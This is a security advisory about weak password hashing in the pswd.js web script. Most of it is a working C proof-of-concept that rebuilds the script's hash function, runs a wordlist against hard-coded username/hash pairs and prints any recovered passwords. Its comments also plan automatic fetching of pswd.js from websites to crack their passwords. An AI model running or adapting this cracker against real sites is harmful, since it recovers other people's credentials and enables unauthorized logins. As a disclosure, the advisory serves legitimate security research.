source: http://www.securityfocus.com/bid/19333/info

Applications running pswd.js are prone to an insecure password-hash weakness. This issue is due to a design flaw that results in password hashes being created in an insecure manner.

This issue allows attackers to use precomputed password hashes in brute-force attacks and authenticate themselves against the vulnerable application running the script. A successful exploit of this issue may lead to other attacks.

2. THE CODE:

/*
 *  processes the word.lst and computes the password :
 * if a hash corresponds to a password listed and in the vector it
prints password, username and hash code
 *
 * todo:
 * 1. make the account file dynamic
 * 2. make the dictionary dynamic
 * 3. make dynamic all the procedure: one could connect to a website,
download the pswd.js file, process it and found passwords...
 *
 * Developed by Gianstefano Monni
 */

#include <stdio.h>
#include <math.h>
#include <string.h>

long pwdchk (char *);

char base[]= {'0','1','2','3','4','5','6','7','8','9',
'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'};
char pass[30];
long f[]={23,535,1047,1559,2071,2583,3095,3607,4119,4631,
12,21,26,38,53,72,101,139,294,375,584,841,1164,1678,2425,4989,6478,10076,14494,21785,30621,69677,87452,139356,201113,278810,
80,83,93,99,113,131,159,194,346,416,619,861,1165,1649,2256,4766,6077,9554,13713,20576,28894,65661,82386,131248,164801,262524};
char K[62];

//the pwd structure
typedef struct
{
    char *user;
    long code;
    char *plain_pass;
}PWD;

//the list of username and passwords, it is hard-coded in the pswd.js file
PWD pwd_list[]=
{
    {"ti8ae88me",73303,""},
    {"koqaaheo",61899,""}
};
//number of elements in pwd_list
int pwd_num=2;


void gen_f()
{
    long x=0;
        long y=28;
        long z=23;

        for (x=0;x<62;x++)
                f[x]=0;

        for (x=0; x<10; x++){
                f[x]=x<<9;
                f[x]+=23;
        }

        for (x=10; x<36; x++){
                y=y<<1;
                long v= (int) sqrt(y);
               v+=5;
                f[x]=v;
                y++;
        }

        for (x=36; x<62; x++){
                z=z<<1;
                long v= (int) sqrt(z);
                v+=74;
                f[x]=v;
                z++;
        }
}

int main (int argc, char ** argv)
{
    char passwd[255];
    FILE * fp=0;
    int x=0;
    int i=0;
        long num=0;
    long code;

    if (argc <=1){
        fp=fopen("word.lst","r");
        if (fp){
            while (!feof(fp)){

                //prints a message every 1M words processed
                if ((++num % 1000000)==0)
                    printf("%d words processed",num);

                //reads the word and computes the hash
                fscanf(fp,"%s",passwd);
                code=pwdchk(passwd);

                //checks if the computed hash is included in the hash
vector
                for (x=0;x<pwd_num;x++)
                    if (code==pwd_list[x].code)
                        //if yes, we've found a password
                        printf("FOUND user: %s password: %s code
%d\n\n",pwd_list[x].user,passwd,code);

            }
        }
    }
    else{
        code=pwdchk(argv[1]);
        printf("%s:%d\n",argv[1],code);
    }
return 0;
}

long pwdchk(char *aPasswd){

    long code=0;
        int l=0,y=0,x=0;
    int lpass=strlen(aPasswd);
    for (l=0; l<lpass; l++)
        K[l]=aPasswd[l];

    for (y=0; y<lpass; y++){
        for(x=0; x<62; x++){
            if (K[y]==base[x])
                code+=((y+1)*f[x]);
        }
    }
    return code;
}


